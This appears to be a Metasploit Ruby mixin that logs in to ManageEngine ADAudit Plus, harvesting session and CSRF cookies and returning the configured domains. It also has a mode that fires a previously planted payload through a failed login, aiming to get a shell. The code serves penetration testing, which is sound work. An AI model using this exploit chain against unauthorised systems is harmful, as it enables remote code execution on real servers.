# -*- coding: binary -*-
module Msf::Exploit::Remote::HTTP::ManageengineAdauditPlus::Login
  include Msf::Exploit::Remote::HTTP::ManageengineAdauditPlus::TargetInfo # for 
  include Msf::Exploit::Remote::HTTP::ManageengineAdauditPlus::URIs

  # performs a ManageEngine ADAudit Plus login
  #
  # @param mode [String] Mode
  # @param auth_domain [String] Authentication domain
  # @param user [String] Username
  # @param pass [String] Password
  # @return [Array] Array containing two to four items, depending on the results: a status code (Integer), a status message (String), a cookie (String), an Array of configured domains as Strings
  def adaudit_plus_login(mode, auth_domain, user='', pass='')
    cookie_jar.clear # let's start fresh
    if mode == 'trigger_payload'
      print_status("Attempting to trigger the payload via an authentication attempt for domain #{@domain_alias} using incorrect credentials.")
      trigger_attempt_fail_message = " You can try to manually trigger the payload via a failed login attempt for the #{@domain_alias} domain."
    else
      trigger_attempt_fail_message = ''
    end

    # visit the default page again to get required cookies
    res_initial_cookies = send_request_cgi({
      'uri' => normalize_uri(target_uri.path),
      'method' => 'GET',
      'keep_cookies' => true
    })

    unless res_initial_cookies
      return [adaudit_plus_status::CONNECTION_FAILED, "Connection failed.#{trigger_attempt_fail_message}"]
    end

    unless res_initial_cookies.code == 200 && res_initial_cookies.headers.include?('Set-Cookie')
      return [adaudit_plus_status::UNEXPECTED_REPLY, "Failed to obtain the necessary cookies to proceed.#{trigger_attempt_fail_message}"]
    end

    # visit another page for more required cookies
    unless mode == 'silent'
      vprint_status('Attempting to obtain the required cookies for authentication')
    end

    res_extra_cookies = send_request_cgi({
      'uri' => adaudit_plus_jump_to_js_uri,
      'method' => 'GET',
      'keep_cookies' => true
    })

    unless res_extra_cookies
      return [adaudit_plus_status::CONNECTION_FAILED, "Connection failed.#{trigger_attempt_fail_message}"]
    end

    unless res_extra_cookies.code == 200 && res_extra_cookies.headers.include?('Set-Cookie') && res_extra_cookies.get_cookies =~ /adapcsrf=[a-z0-9]{128}/
      return [adaudit_plus_status::UNEXPECTED_REPLY, "Failed to obtain the cookies required for authentication.#{trigger_attempt_fail_message}"]
    end

    case mode
    when 'standard_auth'
      print_status('Trying to authenticate...')
    when 'trigger_payload'
      vprint_status('Trying to authenticate...')
    end

    post_vars = {
      'forChecking' => '',
      'j_username' => user,
      'j_password' => pass,
      'domainName' => auth_domain,
      'AUTHRULE_NAME' => 'Authenticator'
    }

    res_login = send_request_cgi({
      'uri' => adaudit_plus_login_uri,
      'method' => 'POST',
      'keep_cookies' => true,
      'vars_post' => post_vars
    })

    if mode == 'trigger_payload'
      # if we're only here to trigger the payload, we should only verify the response code and HTTP title
      if res_login
        if res_login.code == 200 && res_login.body =~ /<title>ADAudit Plus/
          print_status("Trigger attempt completed. Let's hope we get a shell...")
        else
          print_warning('Received unexpected reply after sending the trigger request. Exploitation may not work.')
        end
      else
        print_error('Connection failed while trying to trigger the payload, exploitation most likely failed.')
        print_error(trigger_attempt_fail_message)
      end

      # we don't need to return a message or cookie here so let's set these to empty strings
      return [adaudit_plus_status::SUCCESS, '', '']
    end

    return [adaudit_plus_status::CONNECTION_FAILED, 'Connection failed'] unless res_login

    unless res_login.code == 303 && res_login.headers.include?('Set-Cookie')
      return [adaudit_plus_status::NO_ACCESS, 'Failed to authenticate.']
    end

    # check if we are actually logged in by visiting the home page
    res_post_auth = send_request_cgi({
      'uri' => normalize_uri(target_uri.path),
      'method' => 'GET',
      'keep_cookies' => true
    })

    return [adaudit_plus_status::CONNECTION_FAILED, 'Connection failed'] unless res_post_auth

    unless res_post_auth.code == 200 && res_post_auth.body.include?('ManageEngine ADAudit Plus web client is initializing')
      return [adaudit_plus_status::NO_ACCESS, 'The web app failed to load after authenticating']
    end

    # return the value of the adapcsrf cookie, which will be required for later actions
    adapcsrf_cookie = cookie_jar.cookies.select { |k| k.name == 'adapcsrf' }&.first
    if adapcsrf_cookie.blank? || adapcsrf_cookie.value.blank?
      return [adaudit_plus_status::NO_ACCESS, 'Failed to obtain the required adapcsrf cookie']
    end

    # In order to get a cookie we can actually use, we now need to obtain the configured domains via the api
    # the adaudit_plus_obtain_configured_domains uses the same return format as this method
    adaudit_plus_grab_configured_domains(adapcsrf_cookie.value, mode)
  end
end
